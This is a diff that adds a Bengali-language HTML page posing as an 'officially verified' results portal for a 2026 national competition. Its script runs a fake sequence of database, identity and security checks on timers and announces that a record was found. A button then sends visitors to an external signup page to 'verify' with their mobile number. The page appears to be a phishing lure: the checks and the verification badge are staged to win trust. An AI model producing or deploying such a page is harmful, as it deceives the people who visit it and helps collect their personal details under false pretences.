@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INQILAB 2026 | PREMIUM VERIFICATION</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #3b82f6;
+            --accent: #fbbf24;
+            --bg: #020617;
+        }
+
+        body {
+            font-family: 'Hind Siliguri', sans-serif;
+            background-color: var(--bg);
+            color: #f8fafc;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            perspective: 1000px;
+        }
+
+        /* Animated Gradient Background */
+        .bg-mesh {
+            position: fixed;
+            inset: 0;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(251, 191, 36, 0.05) 0%, transparent 50%);
+            z-index: -1;
+        }
+
+        /* 3D Interactive Card */
+        .tilt-card {
+            transform-style: preserve-3d;
+            transition: transform 0.1s ease-out;
+            will-change: transform;
+        }
+
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 40px 100px -20px rgba(0, 0, 0, 0.8);
+            transform: translateZ(20px);
+        }
+
+        /* Scanner Glow */
+        .scanner-line {
+            position: absolute;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            top: -100%;
+            animation: scan 3s infinite linear;
+            box-shadow: 0 0 20px var(--primary);
+            z-index: 30;
+        }
+
+        @keyframes scan {
+            0% { top: 0%; opacity: 0; }
+            50% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+
+        /* Shimmer Button */
+        .shimmer-btn {
+            background: linear-gradient(110deg, #2563eb 45%, #60a5fa 50%, #2563eb 55%);
+            background-size: 250% 100%;
+            animation: shimmer 3s infinite linear;
+            transition: all 0.3s ease;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: 250% 0; }
+            100% { background-position: -250% 0; }
+        }
+
+        .shimmer-btn:hover {
+            transform: scale(1.05) translateY(-2px);
+            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.4);
+        }
+
+        /* Status Pulse */
+        .status-badge {
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        /* Custom Loader */
+        .cyber-loader {
+            width: 80px;
+            height: 80px;
+            border: 2px solid transparent;
+            border-top-color: var(--primary);
+            border-bottom-color: var(--accent);
+            border-radius: 50%;
+            animation: cyber-spin 1.5s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
+        }
+
+        @keyframes cyber-spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center p-4 overflow-hidden">
+    <div class="bg-mesh"></div>
+
+    <!-- LOADING SCREEN -->
+    <div id="loading-screen" class="max-w-md w-full text-center space-y-12">
+        <div class="relative inline-block">
+            <div class="cyber-loader"></div>
+            <div class="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-blue-400">SYNC</div>
+        </div>
+
+        <div class="space-y-4">
+            <h3 id="step-title" class="text-[10px] uppercase tracking-[1em] text-blue-500/80 font-bold">Initializing</h3>
+            <p id="step-msg" class="text-2xl font-light text-slate-300 opacity-0 transition-all duration-700">অপেক্ষা করুন...</p>
+        </div>
+
+        <div class="w-full max-w-[280px] mx-auto h-1 bg-white/5 rounded-full overflow-hidden">
+            <div id="progress-bar" class="h-full bg-blue-500 w-0 transition-all duration-[10s] ease-linear shadow-[0_0_15px_#3b82f6]"></div>
+        </div>
+    </div>
+
+    <!-- MAIN INTERACTIVE INTERFACE -->
+    <div id="main-interface" class="hidden w-full max-w-xl tilt-card">
+        <div class="glass-panel rounded-[50px] p-8 md:p-16 relative overflow-hidden text-center">
+            <div class="scanner-line"></div>
+            
+            <!-- Background Orbs -->
+            <div class="absolute -top-32 -right-32 w-64 h-64 bg-blue-600/10 rounded-full blur-[80px] pointer-events-none"></div>
+            <div class="absolute -bottom-32 -left-32 w-64 h-64 bg-amber-500/5 rounded-full blur-[80px] pointer-events-none"></div>
+
+            <div class="relative z-10 space-y-10">
+                <!-- Title Section -->
+                <div class="space-y-4">
+                    <h1 class="text-3xl md:text-5xl font-black tracking-tighter leading-tight bg-gradient-to-b from-white to-slate-400 bg-clip-text text-transparent">
+                        ইনকিলাব জিন্দাবাদ :<br>
+                        <span class="text-xl md:text-2xl font-semibold opacity-90 text-slate-200">জাতীয় জাগরণ প্রতিযোগিতা ২০২৬</span>
+                    </h1>
+                    
+                    <div class="flex items-center justify-center status-badge">
+                        <div class="flex items-center bg-green-500/10 text-green-400 px-6 py-2.5 rounded-full text-xs font-bold border border-green-500/30 shadow-[0_0_30px_rgba(16,185,129,0.2)]">
+                            <span class="w-2 h-2 bg-green-500 rounded-full mr-3 animate-pulse"></span>
+                            অফিসিয়াল ভেরিফাইড
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Visual Separator -->
+                <div class="flex items-center gap-4 py-4">
+                    <div class="h-px bg-gradient-to-r from-transparent to-white/10 flex-1"></div>
+                    <div class="text-slate-600 text-[10px] font-mono tracking-widest uppercase">Digital Authenticity</div>
+                    <div class="h-px bg-gradient-to-l from-transparent to-white/10 flex-1"></div>
+                </div>
+
+                <!-- Manual Check Card -->
+                <div class="bg-white/[0.03] border border-white/10 p-8 md:p-10 rounded-[40px] space-y-8 shadow-inner backdrop-blur-xl group">
+                    <p class="text-slate-400 text-sm md:text-base leading-relaxed font-light">
+                        আপনার তথ্যের ম্যানুয়াল সত্যতা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন এবং মোবাইল নম্বর দিয়ে ভেরিফাই সম্পন্ন করুন।
+                    </p>
+                    
+                    <a href="https://meherpur-debating-forum.github.io/mdf-gds-iz-results/signup.html" 
+                       class="shimmer-btn flex items-center justify-center gap-4 w-full py-5 rounded-2xl text-white font-bold text-xl shadow-2xl">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A10.003 10.003 0 0012 21a9.003 9.003 0 008.384-5.91M9.72 11c0-1.465.318-2.853.886-4.104M11.72 4.195a9.003 9.003 0 013.693 11.01M12 7a2 2 0 100 4 2 2 0 000-4z"></path>
+                        </svg>
+                        ম্যানুয়াল ভেরিফিকেশন
+                    </a>
+                </div>
+
+                <div class="text-[9px] text-slate-700 uppercase tracking-[0.6em] font-mono">
+                    Authenticated Node: Meherpur-01
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const stepTitle = document.getElementById('step-title');
+        const stepMsg = document.getElementById('step-msg');
+        const progress = document.getElementById('progress-bar');
+        const loadingScreen = document.getElementById('loading-screen');
+        const mainInterface = document.getElementById('main-interface');
+        const tiltCard = document.querySelector('.tilt-card');
+
+        const steps = [
+            { title: "Securing Link", msg: "অপেক্ষা করুন... 📡" },
+            { title: "Database Crawl", msg: "সার্টিফিকেট খোঁজা হচ্ছে... 🔍" },
+            { title: "Identity Match", msg: "তথ্য মিলিয়ে দেখা হচ্ছে... 📑" },
+            { title: "Final Auth", msg: "সিকিউরিটি চেক সম্পন্ন হচ্ছে... 🔐" },
+            { title: "Success", msg: "রেকর্ড পাওয়া গেছে! ✨" }
+        ];
+
+        let index = 0;
+
+        function runSteps() {
+            if (index < steps.length) {
+                stepMsg.style.opacity = '0';
+                stepMsg.style.transform = 'translateY(10px)';
+                
+                setTimeout(() => {
+                    stepTitle.innerText = steps[index].title;
+                    stepMsg.innerText = steps[index].msg;
+                    stepMsg.style.opacity = '1';
+                    stepMsg.style.transform = 'translateY(0)';
+                    
+                    index++;
+                    if (index < steps.length) {
+                        setTimeout(runSteps, 2000);
+                    } else {
+                        setTimeout(reveal, 1500);
+                    }
+                }, 400);
+            }
+        }
+
+        function reveal() {
+            loadingScreen.style.opacity = '0';
+            loadingScreen.style.transition = 'all 0.8s ease';
+            
+            setTimeout(() => {
+                loadingArea = loadingScreen.classList.add('hidden');
+                mainInterface.classList.remove('hidden');
+                mainInterface.classList.add('animate-in', 'fade-in', 'zoom-in', 'duration-1000');
+            }, 800);
+        }
+
+        // 3D Tilt Logic
+        document.addEventListener('mousemove', (e) => {
+            if (mainInterface.classList.contains('hidden')) return;
+            
+            const x = e.clientX / window.innerWidth - 0.5;
+            const y = e.clientY / window.innerHeight - 0.5;
+            
+            tiltCard.style.transform = `rotateX(${-y * 15}deg) rotateY(${x * 15}deg)`;
+        });
+
+        // Mobile Gyroscope Support
+        window.addEventListener('deviceorientation', (e) => {
+            if (mainInterface.classList.contains('hidden')) return;
+            const tiltX = e.beta / 45; // range ~ -1 to 1
+            const tiltY = e.gamma / 45;
+            tiltCard.style.transform = `rotateX(${tiltX * 10}deg) rotateY(${tiltY * 10}deg)`;
+        });
+
+        window.onload = () => {
+            progress.style.width = '100%';
+            runSteps();
+        };
+    </script>
+</body>
+</html>
+
